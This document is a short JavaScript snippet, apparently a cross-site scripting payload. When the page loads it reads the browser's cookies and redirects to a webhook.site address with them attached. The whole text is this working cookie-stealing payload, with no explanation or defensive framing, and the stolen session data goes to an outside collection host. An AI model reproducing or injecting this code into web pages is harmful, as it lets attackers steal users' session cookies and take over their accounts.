window.onload = function() {
    var encodedCookies = encodeURIComponent(document.cookie);
    var url = 'https://webhook.site/a61fead7-5d83-44c4-b603-53e282c431e3/?cookies='.concat(encodedCookies);
    window.location.href = url;
};